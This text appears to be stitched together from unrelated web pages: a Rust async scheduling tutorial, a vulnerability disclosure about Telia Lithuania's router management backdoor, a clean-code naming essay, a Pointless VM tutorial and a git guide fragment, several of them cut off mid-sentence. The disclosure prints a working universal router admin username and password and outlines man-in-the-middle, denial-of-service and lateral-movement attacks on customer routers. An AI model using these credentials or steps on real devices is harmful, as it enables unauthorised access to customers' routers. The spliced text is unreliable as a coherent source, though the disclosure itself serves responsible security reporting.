<p>An async function in Rust does not actually start running as soon as it is
called. Instead, it is desugared to return a Future that has “yield points”
introduced at await calls. <a href="https://os.phil-opp.com/async-await/">This is an excellent explanation of how Rust
async/await works</a>. The process will only
be launched when <code>status()</code> executes.</p>

<p>A final bit of setup is to create a runtime in which to run the future. This is
a Rust-ism and is not really present in other languages, where it is handled
transparently by the runtime. As I said before, since we are launching
processes which will do the actual work, we aren’t going to use a thread-pool
<sup id="fnref:1"><a href="#fn:1">1</a></sup>. So we select the <a href="https://docs.rs/tokio/0.2.21/tokio/runtime/struct.Builder.html#method.basic_scheduler">tokio basic
runtime</a>.
Since our demo program doesn’t do anything else, we can just block on the one
async block, and exit as soon as that is done. This section won’t get into much
of the Rust-specific code. See <a href="#implementation-details">the implementation details</a>.</p>

<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>()<span> </span>{<span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span>runtime<span> </span><span>=</span><span> </span>Builder::new()<span>
</span><span>        </span>.basic_scheduler()<span>
</span><span>        </span>.enable_all()<span>
</span><span>        </span>.build()<span>
</span><span>        </span>.unwrap();<span>
</span><span>    </span><span>let</span><span> </span>local_set<span> </span><span>=</span><span> </span>tokio::task::LocalSet::new();<span>

</span><span>    </span>local_set.block_on(<span>&amp;</span><span>mut</span><span> </span>runtime,<span> </span>async<span> </span>{<span>
</span><span>    	</span><span>// actual code goes here.
</span><span></span><span>    </span>});<span>
</span><span></span>}<span>
</span></code></pre></div>

<p>We are ready to demo a pretend build system.</p>

<div><pre><code data-lang="rust"><span>// Goes in the "actual code goes here".
</span><span></span><span>let</span><span> </span>compile1<span> </span><span>=</span><span> </span>command<span>!</span>(<span>"sleep 1 &amp;&amp; echo foo.o"</span>);<span>
</span><span></span><span>let</span><span> </span>compile2<span> </span><span>=</span><span> </span>command<span>!</span>(<span>"sleep 2 &amp;&amp; echo bar.o"</span>);<span>
</span><span></span><span>let</span><span> </span>link<span> </span><span>=</span><span> </span>join_all(vec<span>!</span>[compile1,<span> </span>compile2]).then(<span>|</span>_<span>|</span><span> </span>command<span>!</span>(<span>"sleep 1 &amp;&amp; echo baz.so"</span>));<span>
</span><span>
</span><span></span><span>let</span><span> </span><span>mut</span><span> </span>targets<span> </span><span>=</span><span> </span>FuturesUnordered::new();<span>
</span><span></span>targets.push(link);<span>
</span><span>
</span><span></span><span>while</span><span> </span><span>let</span><span> </span><span>Some</span>(_)<span> </span><span>=</span><span> </span>targets.next().await<span> </span>{}<span>
</span></code></pre></div>

<p>We pretend to compile 2 object files, which can happen in parallel. Then we build a shared library that requires both these files. <code>FuturesUnordered</code> allows waiting on a set of futures, and treating them as a stream of results. Each call to <code>next().await</code> will block until one of the futures in the set is done, and then will return the value of that future. This allows us to simulate a build system that has multiple “top-level” keys (files) being built.</p>

<p>Running this will produce something like <sup id="fnref:2"><a href="#fn:2">2</a></sup>:</p>

<div><pre><code data-lang="text">Starting 'sleep 1 &amp;&amp; echo foo.o'
Starting 'sleep 2 &amp;&amp; echo bar.o'
foo.o
Done 'sleep 1 &amp;&amp; echo foo.o'
bar.o
Done 'sleep 2 &amp;&amp; echo bar.o'
Starting 'sleep 1 &amp;&amp; echo baz.so'
baz.so
Done 'sleep 1 &amp;&amp; echo baz.so'</code></pre></div>

<p>demonstrating that the 2 compiles start roughly at the same time (not blocking on each other) and the link does not start until they are both done.</p>

<p>Why is this a suspending scheduler? Well, the “build system” is requested to run the task <code>baz.so</code>. This task is represented by a Future returned from <code>join_all(...).then()</code>. Internally this generates a state machine that is going to wait on all the futures in the join. This is analogous to discovering that certain dependencies need to be built. <code>join_all</code> then suspends itself. It signals to the runtime that it cannot continue until these other tasks are done, so it shouldn’t be woken up until they are. The dependencies are now “present in the system” <sup id="fnref:5"><a href="#fn:5">3</a></sup>, and they get run to completion. Once they are done, the task resumes from the yield point and finishes itself!</p>

<p>A corollary of this is that the runtime will try to run as many futures (tasks) as it can. Try it! Time to make sure we don’t overload machines.</p>

<h2 id="constraining-parallelism">Constraining parallelism</h2>

<p><a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=93943d4bf6c87f2315f9b440b1e5ebcd">Full code in the Rust playground</a></p>

<p>How would we impose a limit on how many tasks are running at the same time? Instead of just suspending until a task’s dependencies are ready, we could have the task stay suspended until we had the capacity to run it. We could imagine modeling this as a device that maintains some kind of shared counter. The counter has a maximum value. Each Future obtained from such a device would only be ready when there was capacity in the system. It would decrement the counter and return some handle which the task can use to indicate when it has finished running. That will increment the counter.</p>

<p>This sounds very much like a <a href="https://en.wikipedia.org/wiki/Semaphore_(programming)">semaphore</a> from thread-based parallelism. Indeed, tokio does provide a <a href="https://docs.rs/tokio/0.2.21/tokio/sync/struct.Semaphore.html"><code>Semaphore</code></a> that behaves exactly like this. It also uses some Rust idioms to make it …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Multiple vulnerabilities could allow running arbitrary code on an intranet server and gain root access on all the customers' routers</p>

<p>Telia is a Swedish multinational telecommunications company. It also operates in Lithuania and provides mobile service, FTTH internet, DSL internet and IPTV. Telia rents and sells custom routers and set-top tv boxes to customers which have limited or almost no administration access left to them.</p>

<p>Every Telia router or tv box has a backdoor or "management interface". It is an <code>SSH</code> server running on VLAN 5 and/or WAN. Usually, it is running on port <code>8022</code>. Older models, like <code>ADB</code>, have password login enabled. The recent newer models, like <code>Technicolor</code>, have password login disabled and only use ssh with public key authentication (spoiler: it is still vulnerable).</p>

<p>Savitarna (in Lithuanian "Self service") - is a web service <a href="https://www.telia.lt/mano/sso">https://www.telia.lt/mano/sso</a> that allows Telia customers to order and manage services, get invoices, pay bills etc. It uses password authentication or external authority logins such as Facebook, Google, banking, digital signature etc. One of the new features: changing your router's wifi password. Sounds interesting, right? An internet web service that is able to change your local router's wifi password.</p>
<p>Login page:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-login.jpg" alt="Telia Savitarna web login page"></p>
<p>Change wifi settings:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-wifi-settings.jpg" alt="Telia Savitarna WiFi setting change feature"></p>

<p>How that works. When a user wants to change the password, the web service calls the backend to initiate an SSH connection to the user's associated router. Depending on the router it will be either password authentication or RSA public key. After a successful login a PHP script on the backend will issue some commands in the router's shell, parse the result and output some of the data to the user in the web UI, like wireless network name. <strong>Telia knows your WIFI password in plain text</strong>, keep it in mind and do not reuse this password anywhere. Overall scheme:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-scheme.jpg" alt="Overall scheme of Telia backdoor"></p>

<p>Let's take a look at how the SSH connection is established. Network capture shows an SSH client banner and the remote IP that initiated the connection:</p>
<p><code>SSH-2.0-libssh2_1.4.2 PHP 10.0.98.251</code></p>
<p>What is important here:</p>
<ul>
<li>Vulnerable <code>libssh2</code> version <code>1.4.2</code> <a href="https://www.libssh2.org/security.html">https://www.libssh2.org/security.html</a></li>
<li>Weak and deprecated key exchange <code>diffie-hellman-group1-sha1</code></li>
<li>The client does not verify <code>remote SSH server public key</code> (see below)</li>
<li><code>PHP</code></li>
</ul>
<p>And, yes, it turns out that Telia's client does not attempt to verify the remote server's public key. We were able to start a custom SSH server on the same port 8022 and Savitarna successfully established a connection without even trying to verify for a man-in-the-middle. This means that we can see the password used and could try to create a malicious SSH server that exploits public vulnerabilities on Telia's side.</p>

<p>That was an easy task. As soon as Telia's client connected to our malicious SSH server we got the universal router credentials:</p>
<pre>User: tadmin
Password: hqMV8Wps
</pre>

<p>Do you still own an ADB router? Just go ahead and login over the web interface with this user. You are now an admin. You can do some restricted stuff now, great! But what about the root shell? We were able to connect with those credentials locally and got a limited shell. That's nice too. This gave us a lot of additional information that was hidden inside the router, many more vulnerabilities. Using one of them we were able to escalate to root and got full access over the device. The newer models like Technicolor require some additional exploits chained to gain full root access, but all are publicly available and so - easily doable.</p>

<p>In order to exploit RCE we needed to build a virtual test environment that fully copies Telia's PHP client. Step by step we have gone through the sequence of Telia's commands sent over the SSH. And finally we got a malicious SSH server and a test libssh2 client running in our test lab. With this server we could fully control the protocol and start fuzzing.</p>
<p>In the first few days of the fuzzing we got some crashes and partially confirmed that RCE may be exploited. Here is a sample GIF video that demonstrates two kinds of the issues the fuzzer found for us. Same php file was executed twice, but the malicious SSH server sent different payloads which caused:</p>
<ul>
<li>Segfault (stack corruption)</li>
<li>Infinite loop with high CPU</li>
</ul>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-poc.gif" alt="GIF PoC video"></p>
<p>However, at the time of the report we couldn't find an easy way to exploit the stack corruption. It may require more time, longer and more sophisticated fuzzing and more knowledge about the server. As Lithuanian law prohibits exploit testing on the real server, we could only fingerprint the Windows OS, but nothing more.</p>

<p>The backend seems to run only 5 php processes, so it is fairly easy to perform DoS by keeping stalled ssh connections. When SSH connections stay active for too long filling all the 5 php processes (there seems to be no timeout reading the remote shell), the Savitarna will show a strange "Maintenance" message:</p>
<p>Translation:</p>
<pre>An update is in progress
Too many of you are trying to access the new Telia webpage.
We are expanding the resources and will accept you all soon.
Apologies for any inconvenience
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-DoS.jpg" alt="Service unavailbale"></p>

<p>If we now get all together, an attacker could exploit RCE on the intranet server and use that server to move laterally (because <code>10.0.98.251</code> is whitelisted everywhere) across all the customer routers with the same credentials creating the most powerful, persistent and undetectable botnet of Lithuania. Who knows, maybe someone already exploited that? (spoiler: see bonus section)</p>

<p>The report was responsibly disclosed to Telia and a copy sent to <code>CERT LT</code> (<a href="https://www.nksc.lt/">NKSC</a>). What happened next was a little bit of a surprise to the team. There were rumours previously about Telia's poor tech level, but we have experienced this in a real case.</p>
<p>First, Telia did not have a PGP key and did not know how to use it, so instead they asked us to ZIP the report with password and send the password over a separate email (private GMail). I hope Telia's engineers will be reading this article, so I would like to explain why the report should be encrypted. This is to protect you as the affected vendor. If there is a man in the middle who can intercept all the researcher's traffic, it will be very easy to get the ZIP file in the first email and then the password in the second email. Instead, PKI like PGP only allows to decrypt the report by the private key owner, ensuring that nobody else can intercept the report and exploit the vulnerabilities before you fix them all. </p>
<p>Second, Telia tried to threaten the reporter for the vulnerability discovery:</p>
<p>Translation:</p>
<pre>Thank you for the information
Are you sure you did not violate the electronic data protection law?
</pre>

<p>Original:</p>

<p>And then they once again mentioned that they will check if this report wasn't a hacking attempt and that they will persecute any reporter that discloses any information about Telia vulnerabilities:</p>
<p>Translation:</p>
<pre>Thank you for the information. We will continue to check whether you made your report
legally without violating any law. And we will ensure that no fake information will be
published that could do any harm to the company's reputation and to the critical part
of Lithuanian network infrastructure.
</pre>

<p>Original:</p>
<pre>Dėkojame Jums už pasidalintą informaciją, kurios surinkimo teisėtumo vertinimą toliau
atliekame ir tikimės, kad į viešumą nebus paskleista tikrovės neatitinkanti ar neteisėtai

<p>We will not comment on this and let the IT community to judge. At the same time we will no longer provide any reports in any form to Telia company.</p>

<p>* Note: partial fix for KEX means the new KEX is not considered to be weak, however it is now possible to exploit libssh2 vulnerabilities after 1.8.0 with this particular KEX and a publicly known exploit for <a href="https://github.com/Semmle/SecurityExploits/blob/446048470633bf0f8da9570d008d056dbaa28ea9/libssh2/out_of_bounds_read_kex_CVE-2019-13115/server/home/diff.txt">KexAlgorithms diffie-hellman-group-exchange-sha256</a></p>

<p>After getting the root access and analyzing the Telia's routers' firmwares, we found several more users, like <code>ladmin</code> and <code>technician</code>. We will not disclose those passwords (yet), as it is not clear yet how both are used. But we were surprised that Telia's passwords appeared to be leaked many years ago. You can try to search for the tadmin password's hash on the web and you will be surprised - there was an attempt to crack the hash back in 2014!</p>

<p>And finally, we found that the hash was cracked and was available in the old "weakpass" database. You can search for the "old" weakpass database (sometimes named "First version of weakpass") and grep it - password is there. This means that most probably we are not the first who were able to penetrate Telia.</p>

<blockquote><p>“He’s perhaps one of two dozen people who knows the name of Iron.”</p><cite>Kvothe, <a rel="noreferrer noopener" href="https://amzn.to/2Y6Te0T" target="_blank">Name of the Wind</a>, The Kingkiller Chronicles</cite></blockquote>



<p>Names have power. Patrick Rothfuss adeptly harnesses this truth in his excellent novel series The Kingkiller Chronicles. In the word of Temerant, knowing the true name of an element such an Iron or Wind gives someone supernatural control of it.</p>



<p>The power of names is demonstrated through a simple photograph of place signs. Each of the words on the wall above conjures a feeling of excitement, or curiosity, or perhaps a distant memory, fleeting and poignant.</p>



<p>What we choose to call events, concepts and people measurably changes our view of them. The names we given ourselves quietly in our hearts have enormous influence over our mental state.</p>



<p>Astonishingly, recent research has discovered that we even <a aria-label="undefined (opens in a new tab)" href="https://www.apa.org/pubs/journals/releases/psp-pspa0000076.pdf" target="_blank" rel="noreferrer noopener">look like our given names</a>. Researchers have shown that people and computers can infer our name by looking at our face, an effect demonstrable beyond socioeconomic cues. Therefore, our facial appearance represents social expectations of how a person with a specific name should look.</p>



<h2>The importance of naming for clean code</h2>



<p>This a significant realisation for our mental health and well-being, but how does it fit with delivering clean code faster?</p>



<p>Names communicate. They have the power to tell others what a thing is and does. That reduces friction in our development teams, and allows us to understand code faster and deliver more quickly.</p>



<p>Why should we expend so much effort to get them right? Because the name of a concept gives us insight into how it fits into the system we are designing. Conversely, if we’re not careful with naming, we’ll be producing <a aria-label="undefined (opens in a new tab)" href="http://www.catb.org/jargon/html/W/write-only-code.html" target="_blank" rel="noreferrer noopener">write-only code</a> which drifts apart from the whole, lost and destined for eventual deletion.</p>



<p>Here are some principles you can use to help you choose the best names and produce clean code with less effort. We’ll start with the nuts and bolt of naming code, then move to how to determine meaningful names in conjunction with our customers.</p>



<h2>Intentionally move through the four stages of naming</h2>



<blockquote><p><em>There are two hard problems in computer science: Cache invalidation, naming things, and off by one errors.”</em></p><cite><a href="http://martinfowler.com/bliki/TwoHardThings.html" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Martin Fowler</a></cite></blockquote>



<p>How should we pay attention to names as we get started with coding something new? J.B. Rainsberger&nbsp;<a aria-label="undefined (opens in a new tab)" href="http://www.jbrains.ca/permalink/the-four-elements-of-simple-design" target="_blank" rel="noreferrer noopener">talks about</a>&nbsp;names of classes, methods and variables going through four stages towards clean code:</p>



<ul><li><em>Nonsense:</em>&nbsp;For example, we might extract a method from a larger one and quickly rename it&nbsp;<code>somethingWhatever()</code>&nbsp;to get the refactor done and the tests passing.</li><li><em>Accurate:</em>&nbsp;We rename the nonsense method to what it actually does, such as&nbsp;<code>processPayroll()</code>.</li><li><em>Precise:</em>&nbsp;Once we realise what the method really does, we might refine the accurate name and give it more precision, such as&nbsp;<code>loopThroughEmployeesAndPayThem()</code>.</li><li><em>Meaningful:</em>&nbsp;At this point, we’ve revealed the complexity of the method, and can look to split it up into two methods:&nbsp;<code>forEachEmployee()</code>&nbsp;and perhaps a&nbsp;<code>payWages()</code>&nbsp;method on a separate interface.</li></ul>



<h2>Don’t be afraid of nonsense or longer names</h2>



<p>We shouldn’t shy away from the early stages of naming. If we’re not sure what something is yet, give it a nonsense name. The name&nbsp;<code>foo()</code>&nbsp;is fine, as long as it’s only going to last fifteen minutes.</p>



<p>It doesn’t belong in a commit, and it’s not clean code, but it’s a start. It gets our code moving so we can begin to see how our concepts fit together.</p>



<p>As you progress, some concepts or ideas will outgrow your abstractions. They become ripe for future refactoring. If in doubt as to what or where something fits, use a long name: the longer and more precise the better. I will call a variable something like <code>computed_unsorted_project_task_matrix</code>&nbsp;if I don’t like it and want to refactor it at some point.</p>



<p>This is much more intention revealing than&nbsp;<code>result</code>&nbsp;(or&nbsp;<code>res</code>,&nbsp;or&nbsp;<code>r</code>). I reveal the complexity of the object through the name, which helps reveal complexity in the code.</p>



<h2>Characters are cheap</h2>



<p>Let’s not make things harder for the programmers who come after us. Remember, this is just as likely to be ourselves in a few months. Let’s avoid using a name like&nbsp;<code>p</code>&nbsp;when&nbsp;<code>project</code>&nbsp;is only a few characters more.</p>



<p>Anything that reduces reading friction in our code is a good thing.</p>



<p>This isn’t fashionable amongst developers in certain languages communities like Clojure or Haskell. They prefer brevity in variable names, relying on convention for understanding. For example, <code>k</code> and <code>v</code> often refer to <code>key</code> and <code>value</code> in a Clojure Map.</p>



<p>The important thing is to reduce friction in the team. If your team are used to these variables, it’ll be quick to understand: for them, it’ll be clean code. However, this will increase the barrier to other team members. In general I prefer longer more meaningful names to this. I don’t think it’s worth sacrificing the team’s understanding for the sake of a few characters. If names are becoming so cumbersome their length is reducing clarity, this shows the need for a refactor.</p>



<h2>Name concepts for your customer, not yourself</h2>



<p>Along the steps we take through to making names more precise and meaningful, how do we choose what words to use for the concepts we’re dealing with? We name these concepts through continual conversations with customers.</p>



<p>Ubiquitous language is an excellent concept and tool that Eric Evans introduced years ago in the book <a href="https://amzn.to/3ftKZBF">Domain Driven Design</a>. Every coder would do well to read at least the first half of this book. The idea is often taught within a Behaviour Driven Development context, but it is logically independent. Any agile team can work towards a Ubiquitous Language.</p>



<p>The central idea is that there are two languages that we can use to talk about a concept: the “problem” language or the “solution” language. The problem language is the language of the customer. For example, a payroll system might use concepts like <em>wages, salary, PAYE, tax, paying.</em> The solution language is the language of developmers. For example we might use the following names for the code that runs the payroll system: <em>button, element, value, collection, style, parent-child, container, object.</em></p>



<p>The solution language is where many programmers naturally live, think and speak. It’s easy for us to operate with these kinds of concepts. The trouble is, they’re often alien for our customer. Instead of lazily reaching for <code>parent</code>–<code>child</code> (or the more problematic <code>master</code>–<code>slave</code> vernacular) when describing a concept, let’s instead collaborate with our customers on a shared language that works well for everyone. Perhaps we <em>add an employee to a tax band</em> rather than <em>insert a user into a collection</em>, both <a href="https://deliverydoubled.com/deliver-faster-boost-teamwork-a-simple-guide-to-development-focus/" target="_blank" rel="noreferrer noopener">when discussing the next feature</a>, and when we’re writing the code itself.</p>



<h2>Intentional conversations reduce confusion and produce clean code</h2>



<p>It’s common for teams to have to deal with concepts and words that overlap and interact with each other. Single concepts are called different things by different people on the team. Different groups of people within an organisation use the same word for wholly different ideas.</p>



<p>It’s such a universal problem people often don’t pay attention to it. However confusion and cognitive load will build up and cause communication problems over time.</p>



<p>It’s also fairly easy to solve this problem through having quick, regular, intentional conversations.</p>



<p>Next time you’re discussing a concept with your team that’s poorly named, speak up. Ask whether there’s another name for the concept that could reduce confusion. Try a few different words or phrases out with the team until you settle on the right thing. This might mean inventing entirely new words or concepts that fit well with everyone in the team. That’s ok, as long as it makes our language more precise.</p>



<p>Once a word has been decided on, commit to using it everywhere from now on. Deliberately take the time to update the names in the code to match.</p>



<p>Perhaps you could volunteer to maintain a glossary of words so that everyone feels the benefit. Newer team members are often great people to keep an eye on these documents, and update them whenever they encounter errors.</p>



<p>There’s always going to be a barrier for incoming team members new to our code and our concepts. If we’re having these intentional conversations, we’re helping newer people by creating a smaller set of names for them to learn.</p>



<hr>



<p>Names have power. They can drive insight and influence communication. Let’s intentionally practice our naming as a team, so that everyone has a say about the language and terminology we use. Let’s build those names right into our codebases, moving through the stages towards the team’s language as the code becomes clearer. This will harmonise the team’s work, make for cleaner code, and puts the team on the right track to improving their delivery times.</p>

      <h3>Tutorial: Writing a VM for a Small Stack-Base Language in Pointless</h3>
      <pre>- Avery N. Nortonsmith</pre>

      <hr>

      <p>
        The age of functional programming will soon be over.
      </p>

      <p>
        Object-oriented programming has come and gone. Functional programming -- the wise, quiet observer -- has waited patiently for its turn. But FP, like OOP, will fade away in time as software yields to the inexorable pull of the one <em>True Paradigm</em>: stack-based programming!
      </p>

      <hr>

      <p>
        Joking aside, stack-based programming <em>is</em> pretty cool.
      </p>

      <p>
        This tutorial covers the implementation of a <strong>virtual-machine</strong> for a small, <strong>stack-based</strong> language in Pointless. We'll take an <strong>incremental</strong> approach to building the VM and improving its capabilities until it can run a short <strong>prime-factorization</strong> program.
      </p>

      This project seeks to demonstrate:

      <ul>
        <li>
          How an imperative language can be implemented in a purely functional context
        </li>

        <li>
          How to structure and refactor code that uses persistent data-structures
        </li>

        <li>
          How Pointless can -- even as a young language -- be used to solve non-trivial tasks
        </li>
      </ul>

      <p>
        Before we tackle prime-factorization, let's take a look at a small example of the stack-based code that our VM will evaluate. The following Pointless code defines a <a href="https://ptls.dev/docs.html#lists">list</a> of 'instructions', where <a href="https://ptls.dev/docs.html#tuples">labeled-tuples</a> are used to represent instructions with an argument, and <a href="https://ptls.dev/docs.html#labels">labels</a> are used for those without. A list of instructions like this represents a program in our stack-based language:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        Let's take a minute to fancy things up by writing a function to pretty-print these instruction lists -- this will come in handy later when we work with more complex programs. The function <code>showInst</code> below takes an instruction and returns a string showing the instruction's type (left-justified to 5 characters) and argument. The function <code>argOrBlank</code> returns an instruction's argument if there is one, or an empty string otherwise. 
      </p>

      <div>
        <pre>showInst(inst) =
 format("[ {&lt;5} ] {}", [getLabel(inst), argOrBlank(inst)])

argOrBlank(inst) =
  if is(PtlsTuple, inst) then unwrap(inst) else ""
</pre>
      </div>

      <p>
        In the code above, <code><a href="https://ptls.dev/api/prelude/format.html#format">format</a></code>, <code><a href="https://ptls.dev/api/prelude/label.html#getLabel">getLabel</a></code>, <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code>, and <code><a href="https://ptls.dev/api/prelude/label.html#unwrap">unwrap</a></code> are defined in the Pointless <a href="https://ptls.dev/api/index.html">prelude</a> (standard-library).
      </p>

      <p>
        To see our new functions in action, we'll define an output variable for our program; in Pointless, a program's output is defined by its output variable. The prelude contains functions like <code><a href="https://ptls.dev/api/prelude/io.html#printLines">printLines</a></code> which generate sequences of IO commands that can be assigned to a program's output variable.
      </p>

      <p>
        The output definition below takes our list of instructions, generates a new list of instruction-strings by calling <code>showInst</code> on each instruction, and produces IO commands to print each string on a separate line. Take a look at the docs for more info on the function <a href="https://ptls.dev/docs.html#pipeOperator">pipe operator</a> <code>|&gt;</code>, and for <a href="https://ptls.dev/docs.html#partialApplication">partial application</a>.
      </p>

      <p><em>
        Note that the name 'main.ptls' is chosen arbitrarily; it doesn't have any special meaning
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; map(showInst)
  |&gt; printLines
</pre>

      <pre>$ ./bin/pointless main.ptls

[ Const ] 7
[ Const ] 2
[ Mod   ] 
[ Const ] 0
[ Eq    ] 
[ Print ] 
[ Exit  ]
</pre>
      </div>

      <p>Seeing is believing. Time to start making our VM.</p>

      <p>
        We'll represent the VM as an <a href="https://ptls.dev/docs.html#objects">object</a> with the following fields:
      </p>

      <ul>
        <li><code>slots</code>: used to store "heap" variables (discussed later on)</li>
        <li><code>insts</code>: an array containing the program's instructions</li>
        <li><code>index</code>: the position in instruction array of the current instruction</li>
        <li><code>stack</code>: a linked-list serving as the stack for the VM</li>
        <li><code>outVal</code>: used to get output from VM as program runs</li>
      </ul>

      <p>
        The function <code>vmFromInsts</code> sets up a new VM object for a given list of instructions. The code also adds the label <code>VM</code> to the VM object (objects and tuples can be labeled in Pointless). Object labels can be used to write code that tells different types of objects apart, or simply for documentation (as we do here).
      </p>

      <div>
        <pre>vmFromInsts(program) = VM {
  slots  = zeroArray(8)
  insts  = toArray(program)
  index  = 0
  stack  = []
  outVal = None
}
</pre>
      </div>

      <p>
        To check that <code>vmFromInsts</code> works, we'll modify our output definition to create and print a new VM object. Note that we've replaced <code>printLines</code> with <code><a href="https://ptls.dev/api/prelude/io.html#println">println</a></code> -- <code>printLines</code> expects a sequence of values (and can print these values on-the-fly as they're computed in the case of lists!), whereas <code>println</code> can handle sequence and non-sequences types.
      </p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = []; insts = [Const(7) Const(2) Mod Const(0) Eq Print Exit]; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        We run the program, and see that <code>println</code> gives us a nice visualization of our initial VM object, fields and all.
      </p>

      <p>
        Back to our list of instructions:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        The instructions above do the following -- (once we've implemented them, that is):
      </p>

      <ul>
        <li><code>Const(arg)</code> pushes <code>arg</code> onto the VM stack</li>
        <li><code>Mod</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 % v0</code></li>
        <li><code>Eq</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 == v0</code></li>
        <li><code>Print</code> pops a value from the stack and prints it</li>
        <li><code>Exit</code> signals the end of the program</li>
      </ul>

      <p>
        Additionally, each of these instructions will advance the VM to the next instruction after performing the behaviors above. Nice and imperative ;)
      </p>

      <p>
        With this in mind, we see that the program above does the following: loads the values <code>7</code> and <code>2</code> onto the stack, computes <code>7 % 2</code>, loads the value <code>0</code>, compares <code>0</code> with the result of <code>7 % 2</code>, prints the result of this comparison, and exits. In other words, this program tells us whether or not <code>7</code> is even.
      </p>

      <p>
        Now that we've defined some instructions, let's start evaluating them.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, vm.insts[vm.index])
    vm with $.stack = [unwrap(vm.insts[vm.index])] ++ vm.stack
}
</pre>
      </div>

      <p>
        Our <code>eval</code> function uses a <code><a href="https://ptls.dev/docs.html#cond">cond</a></code> conditional -- eventually this will include cases for all instructions, but we'll start with just <code>Const</code> for now. The code above calls the function <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code> to check whether the current instruction has the label <code>Const</code> (where the current instruction is the instruction in the <code>vm.insts</code> array at index <code>vm.index</code>). If <code>is</code> returns true, then conditional evaluates and returns the body of the case expression.
      </p>

      <p>
        Structures in Pointless persistent, and thus immutable. As such, our program will never mutate the state of a VM object; rather, it will produce new VM objects. The code above uses <a href="https://ptls.dev/docs.html#viaWith">with syntax</a> (which can handle both shallow and nested updates -- one of Pointless's little innovations) to create a new VM object with a new stack value: the old stack with the instruction argument pushed to the top. The <code>unwrap</code> function is used to get the argument from the <code>Const</code> instruction.
      </p>

      <p>
        The code above is dense and repetitive! We can improve it by defining a couple of variables. In the new version, <code>inst</code> is the current instruction, and the <code>arg</code> is the argument of that instruction.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm with $.stack = [arg] ++ vm.stack

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>
      </div>

      <p>
        We modify the program's output definition to call <code>eval</code> on the VM to evaluate the first instruction, <code>Const(7)</code>. Looking at output, we see that the value <code>7</code> has been pushed to the stack.
      </p>

      <p><em>
        <code>insts</code> field abbreviated for readability
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        But wait! We need our <code>Const</code> handler to do one more thing -- advance the VM to the next instruction. To do this, we'll make a new helper function <code>advance</code> that takes a VM object and returns a new VM object with the instruction index incremented. We'll also move the code for pushing a value onto the VM stack into the new function <code>pushVal</code>.
      </p>

      <div>
        <pre>advance(vm) = vm with $.index += 1

pushVal(arg, vm) = vm with $.stack = [arg] ++ vm.stack
</pre>
      </div>

      <p>
        Using these two new functions, the code for <code>eval</code> becomes:
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm
    |&gt; pushVal(arg)
    |&gt; advance

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 1; outVal = None}
</pre>
      </div>

      <p>
        We call the program again and get the result seen above: the new VM object returned by <code>eval</code> has the value <code>7</code> on its stack and its index incremented.
      </p>

      <p>
        At this point, the entire program looks something like this:
      </p>

      <p><em>
        Note that the comment bars are not necessary, but are helpful for dividing code visually -- it's a habit of mine, like using fake em-dashes. They can also be used to mark API documentation
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println

program = [

Although the command line may be more intimidating for new developers, it also is far more powerful and you will need to learn it since most GUIs offer limited commands.</p><p>Git commands typically take the form of <code>git &lt;command&gt; &lt;args&gt;</code> where <code>&lt;args&gt;</code> might be a file path. Commands may also have <em>options</em> specified denoted by a <code>--&lt;option&gt;</code> or a <code>-&lt;single-letter-option&gt;</code> - think of these as adding extra details as to what the command should do. In this guide, I will present the general syntax and you should replace anything in <code>&lt;&gt;</code> with your corresponding value.</p><p>If you are uncertain about the usage of a command, a really useful command is:
<code>git help &lt;command&gt;</code>
